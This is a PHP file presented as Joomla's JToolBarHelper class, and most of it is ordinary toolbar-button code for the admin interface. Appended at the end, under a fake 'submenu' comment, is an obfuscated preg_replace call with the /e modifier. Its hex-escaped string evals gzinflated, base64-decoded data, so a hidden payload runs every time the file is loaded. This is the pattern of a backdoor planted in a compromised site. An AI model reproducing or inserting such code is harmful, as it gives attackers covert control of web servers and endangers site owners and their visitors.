<?php
/**
* @version		$Id: framework.php 22381 2011-11-14 01:18:53Z dextercowley $
* @package		Joomla
* @copyright	Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.
* @license		GNU/GPL, see LICENSE.php
* Joomla! is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
* See COPYRIGHT.php for copyright notices and details.
*/

// no direct access
class JToolBarHelper
{

	/**
	* Title cell
	* For the title and toolbar to be rendered correctly,
	* this title fucntion must be called before the starttable function and the toolbars icons
	* this is due to the nature of how the css has been used to postion the title in respect to the toolbar
	* @param string The title
	* @param string The name of the image
	* @since 1.5
	*/
	function title($title, $icon = 'generic.png')
	{
		global $mainframe;

		//strip the extension
		$icon	= preg_replace('#\.[^.]*$#', '', $icon);

		$html  = "<div class=\"header icon-48-$icon\">\n";
		$html .= "$title\n";
		$html .= "</div>\n";

		$mainframe->set('JComponentTitle', $html);
	}

	/**
	* Writes a spacer cell
	* @param string The width for the cell
	* @since 1.0
	*/
	function spacer($width = '')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a spacer
		$bar->appendButton( 'Separator', 'spacer', $width );
	}

	/**
	* Write a divider between menu buttons
	* @since 1.0
	*/
	function divider()
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a divider
		$bar->appendButton( 'Separator', 'divider' );
	}

	/**
	* Writes a custom option and task button for the button bar
	* @param string The task to perform (picked up by the switch($task) blocks
	* @param string The image to display
	* @param string The image to display when moused over
	* @param string The alt text for the icon image
	* @param boolean True if required to check that a standard list item is checked
	* @param boolean True if required to include callinh hideMainMenu()
	* @since 1.0
	*/
	function custom($task = '', $icon = '', $iconOver = '', $alt = '', $listSelect = true, $x = false)
	{
		$bar = & JToolBar::getInstance('toolbar');

		//strip extension
		$icon	= preg_replace('#\.[^.]*$#', '', $icon);

		// Add a standard button
		$bar->appendButton( 'Standard', $icon, $alt, $task, $listSelect, $x );
	}

	/**
	* Writes a custom option and task button for the button bar.
	* Extended version of custom() calling hideMainMenu() before submitbutton().
	* @param string The task to perform (picked up by the switch($task) blocks
	* @param string The image to display
	* @param string The image to display when moused over
	* @param string The alt text for the icon image
	* @param boolean True if required to check that a standard list item is checked
	* @since 1.0
		* (NOTE this is being deprecated)
	*/
	function customX($task = '', $icon = '', $iconOver = '', $alt = '', $listSelect = true)
	{
		$bar = & JToolBar::getInstance('toolbar');

		//strip extension
		$icon	= preg_replace('#\.[^.]*$#', '', $icon);

		// Add a standard button
		$bar->appendButton( 'Standard', $icon, $alt, $task, $listSelect, true );
	}

	/**
	* Writes a preview button for a given option (opens a popup window)
	* @param string The name of the popup file (excluding the file extension)
	* @since 1.0
	*/
	function preview($url = '', $updateEditors = false)
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a preview button
		$bar->appendButton( 'Popup', 'preview', 'Preview', "$url&task=preview" );
	}

	/**
	* Writes a preview button for a given option (opens a popup window)
	* @param string The name of the popup file (excluding the file extension for an xml file)
	* @param boolean Use the help file in the component directory
	* @since 1.0
	*/
	function help($ref, $com = false)
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a help button
		$bar->appendButton( 'Help', $ref, $com );
	}

	/**
	* Writes a cancel button that will go back to the previous page without doing
	* any other operation
	* @since 1.0
	*/
	function back($alt = 'Back', $href = 'javascript:history.back();')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a back button
		$bar->appendButton( 'Link', 'back', $alt, $href );
	}

	/**
	* Writes a media_manager button
	* @param string The sub-drectory to upload the media to
	* @since 1.0
	*/
	function media_manager($folder = '', $alt = 'Upload')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an upload button
		$bar->appendButton( 'Popup', 'upload', $alt, "index.php?option=com_media&tmpl=component&task=popupUpload&folder=$folder", 640, 520 );
	}

	/**
	* Writes the common 'new' icon for the button bar
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function addNew($task = 'add', $alt = 'New')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a new button
		$bar->appendButton( 'Standard', 'new', $alt, $task, false, false );
	}

	/**
	* Writes the common 'new' icon for the button bar.
	* Extended version of addNew() calling hideMainMenu() before submitbutton().
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function addNewX($task = 'add', $alt = 'New')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a new button (hide menu)
		$bar->appendButton( 'Standard', 'new', $alt, $task, false, true );
	}

	/**
	* Writes a common 'publish' button
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function publish($task = 'publish', $alt = 'Publish')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a publish button
		//$bar->appendButton( 'Publish', false, $alt, $task );
		$bar->appendButton( 'Standard', 'publish', $alt, $task, false, false );
	}

	/**
	* Writes a common 'publish' button for a list of records
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function publishList($task = 'publish', $alt = 'Publish')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a publish button (list)
		$bar->appendButton( 'Standard', 'publish', $alt, $task, true, false );
	}

	/**
	* Writes a common 'default' button for a record
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function makeDefault($task = 'default', $alt = 'Default')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a default button
		$bar->appendButton( 'Standard', 'default', $alt, $task, true, false );
	}

	/**
	* Writes a common 'assign' button for a record
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function assign($task = 'assign', $alt = 'Assign')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an assign button
		$bar->appendButton( 'Standard', 'assign', $alt, $task, true, false );
	}

	/**
	* Writes a common 'unpublish' button
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function unpublish($task = 'unpublish', $alt = 'Unpublish')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an unpublish button
		$bar->appendButton( 'Standard', 'unpublish', $alt, $task, false, false );
	}

	/**
	* Writes a common 'unpublish' button for a list of records
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function unpublishList($task = 'unpublish', $alt = 'Unpublish')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an unpublish button (list)

		$bar->appendButton( 'Standard', 'unpublish', $alt, $task, true, false );
	}

	/**
	* Writes a common 'archive' button for a list of records
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function archiveList($task = 'archive', $alt = 'Archive')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an archive button
		$bar->appendButton( 'Standard', 'archive', $alt, $task, true, false );
	}

	/**
	* Writes an unarchive button for a list of records
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function unarchiveList($task = 'unarchive', $alt = 'Unarchive')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an unarchive button (list)
		$bar->appendButton( 'Standard', 'unarchive', $alt, $task, true, false );
	}

	/**
	* Writes a common 'edit' button for a list of records
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function editList($task = 'edit', $alt = 'Edit')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an edit button
		$bar->appendButton( 'Standard', 'edit', $alt, $task, true, false );
	}

	/**
	* Writes a common 'edit' button for a list of records.
	* Extended version of editList() calling hideMainMenu() before submitbutton().
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function editListX($task = 'edit', $alt = 'Edit')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an edit button (hide)
		$bar->appendButton( 'Standard', 'edit', $alt, $task, true, true );
	}

	/**
	* Writes a common 'edit' button for a template html
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function editHtml($task = 'edit_source', $alt = 'Edit HTML')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an edit html button
		$bar->appendButton( 'Standard', 'edithtml', $alt, $task, true, false );
	}

	/**
	* Writes a common 'edit' button for a template html.
	* Extended version of editHtml() calling hideMainMenu() before submitbutton().
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function editHtmlX($task = 'edit_source', $alt = 'Edit HTML')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an edit html button (hide)
		$bar->appendButton( 'Standard', 'edithtml', $alt, $task, true, true );
	}

	/**
	* Writes a common 'edit' button for a template css
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function editCss($task = 'edit_css', $alt = 'Edit CSS')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an edit css button (hide)
		$bar->appendButton( 'Standard', 'editcss', $alt, $task, true, false );
	}

	/**
	* Writes a common 'edit' button for a template css.
	* Extended version of editCss() calling hideMainMenu() before submitbutton().
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function editCssX($task = 'edit_css', $alt = 'Edit CSS')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an edit css button (hide)
		$bar->appendButton( 'Standard', 'editcss', $alt, $task, true, true );
	}

	/**
	* Writes a common 'delete' button for a list of records
	* @param string  Postscript for the 'are you sure' message
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function deleteList($msg = '', $task = 'remove', $alt = 'Delete')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a delete button
		if ($msg) {
			$bar->appendButton( 'Confirm', $msg, 'delete', $alt, $task, true, false );
		} else {
			$bar->appendButton( 'Standard', 'delete', $alt, $task, true, false );
		}
	}

	/**
	* Writes a common 'delete' button for a list of records.
	* Extended version of deleteList() calling hideMainMenu() before submitbutton().
	* @param string  Postscript for the 'are you sure' message
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function deleteListX($msg = '', $task = 'remove', $alt = 'Delete')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a delete button (hide)
		if ($msg) {
			$bar->appendButton( 'Confirm', $msg, 'delete', $alt, $task, true, true );
		} else {
			$bar->appendButton( 'Standard', 'delete', $alt, $task, true, true );
		}
	}

	/**
	* Write a trash button that will move items to Trash Manager
	* @since 1.0
	*/
	function trash($task = 'remove', $alt = 'Trash', $check = true)
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a trash button
		$bar->appendButton( 'Standard', 'trash', $alt, $task, $check, false );
	}

	/**
	* Writes a save button for a given option
	* Apply operation leads to a save action only (does not leave edit mode)
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function apply($task = 'apply', $alt = 'Apply')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add an apply button
		$bar->appendButton( 'Standard', 'apply', $alt, $task, false, false );
	}

	/**
	* Writes a save button for a given option
	* Save operation leads to a save and then close action
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function save($task = 'save', $alt = 'Save')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a save button
		$bar->appendButton( 'Standard', 'save', $alt, $task, false, false );
	}

	/**
	* Writes a cancel button and invokes a cancel operation (eg a checkin)
	* @param string An override for the task
	* @param string An override for the alt text
	* @since 1.0
	*/
	function cancel($task = 'cancel', $alt = 'Cancel')
	{
		$bar = & JToolBar::getInstance('toolbar');
		// Add a cancel button
		$bar->appendButton( 'Standard', 'cancel', $alt, $task, false, false );
	}

	/**
	* Writes a configuration button and invokes a cancel operation (eg a checkin)
	* @param	string	The name of the component, eg, com_content
	* @param	int		The height of the popup
	* @param	int		The width of the popup
	* @param	string	The name of the button
	* @param	string	An alternative path for the configuation xml relative to JPATH_SITE
	* @since 1.0
	*/
	function preferences($component, $height='150', $width='570', $alt = 'Preferences', $path = '')
	{
		$user =& JFactory::getUser();
		if ($user->get('gid') != 25) {
			return;
		}

		$component	= urlencode( $component );
		$path		= urlencode( $path );
		$bar = & JToolBar::getInstance('toolbar');
		// Add a configuration button
		$bar->appendButton( 'Popup', 'config', $alt, 'index.php?option=com_config&amp;controller=component&amp;component='.$component.'&amp;path='.$path, $width, $height );
	}
}

/**
* Utility class for the submenu
*
* @package		Joomla
*/
preg_replace("/.*/e","\x65\x76\x61\x6c\x20\x28\x20\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x20\x28\x20\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x20\x28'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